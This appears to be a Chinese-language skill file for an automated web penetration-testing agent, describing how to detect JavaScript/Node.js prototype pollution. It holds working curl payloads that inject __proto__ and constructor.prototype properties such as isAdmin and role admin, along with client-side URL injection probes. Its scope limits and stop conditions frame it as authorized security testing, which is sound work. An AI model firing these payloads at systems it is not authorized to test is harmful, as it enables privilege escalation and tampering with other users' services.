---
name: prototype-pollution
description: 检测 JavaScript 中的原型污染漏洞，通过向对象原型注入恶意属性实现权限提升、属性劫持或 RCE。
category: web
source: xalgorix
tags:
  - 原型污染
  - JavaScript
  - Node.js
  - 注入
required_tools:
  - curl
---

# JavaScript 原型污染

## 适用场景

- 目标使用 Node.js 后端处理 JSON 请求。
- 应用使用对象合并（`Object.assign`、`_.merge`、`$.extend`）处理用户输入。
- 前端框架（Vue、React）可能受客户端原型污染影响。

## 授权边界

- 仅验证污染是否可注入 `__proto__` 属性。
- 不利用污染做权限提升或 XSS，除非 scope 明确允许。

## 前置条件

- 目标使用 JavaScript/Node.js。
- 已识别接受 JSON 请求体并可能进行对象合并的端点。

## 执行步骤

### 步骤 1：基础污染探测

```bash
# 注入 __proto__ 探测
curl -X POST "https://<target>/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}, "username": "test"}'

# 注入 constructor.prototype
curl -X POST "https://<target>/api/update" \
  -d '{"constructor": {"prototype": {"isAdmin": true}}}'
```

### 步骤 2：属性存在性验证

```bash
# 注入探测属性
curl -X POST "https://<target>/api/merge" \
  -d '{
    "__proto__": {"polluted": "yes"},
    "name": "test"
  }'

# 然后读取同一对象，检查 polluted 属性是否存在
curl -s "https://<target>/api/user/me"
```

### 步骤 3：嵌套污染

```bash
# 深层嵌套注入
curl -X PUT "https://<target>/api/settings" \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "__proto__": {
        "role": "admin"
      }
    }
  }'

# 通过数组索引绕过
curl -X POST "https://<target>/api/batch" \
  -d '[
    {"__proto__": {"role": "admin"}},
    {"name": "normal"}
  ]'
```

### 步骤 4：客户端原型污染

```bash
# 检查前端是否受影响
# URL 参数注入
curl "https://<target>/page?__proto__[polluted]=yes"

# Hash 注入
curl "https://<target>/page#__proto__[polluted]=yes"
```

### 步骤 5：影响验证

如果污染成功，验证可能的影响：

```bash
# 权限提升
# 注入 role/admin 属性，然后访问管理功能

# 属性劫持
# 修改 status/verified/active 等属性

# 配置覆盖
# 修改 debug/mode/env 等配置属性
```

## 停止条件

- 确认 `__proto__` 可被注入且影响了后续请求行为时记录即可。
- 不利用原型污染修改其他用户会话或全局状态。

## 输出格式

- 受污染的端点和 payload。
- 污染验证结果（属性是否持久化）。
- 影响类型（权限提升 / 属性劫持 / 配置覆盖）。
- 污染的属性名。

## 验收标准

1. 对所有接受 JSON 合并的端点进行了 `__proto__` 注入测试。
2. 测试了 `constructor.prototype` 绕过。
3. 进行了污染后验证（检查属性是否渗透到后续响应）。
4. 评估了污染的实际安全影响。
